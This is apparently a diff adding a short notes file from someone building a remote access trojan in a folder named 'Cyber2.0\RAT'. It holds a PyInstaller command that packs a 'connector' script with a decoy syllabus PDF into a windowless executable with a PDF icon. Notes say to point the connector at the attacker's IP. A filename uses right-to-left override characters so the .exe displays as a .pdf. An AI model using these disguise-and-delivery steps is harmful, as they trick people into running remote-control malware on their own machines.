@@ -1,0 +1,10 @@
+C:\Users\Optim\AppData\Roaming\Python\Python312\Scripts\pyinstaller.exe --add-data "C:\Users\Optim\OneDrive\Documents\Cyber2.0\RAT\syllabus.pdf;." --onefile --noconsole --icon=pdf.ico connector2.py
+--icon=NONE
+
+need to change the ip in the connector - to the attacker ip
+need to change the ip in the listener to every1
+
+
+
+‮‭syllabus-refl‮fdp.exe
+
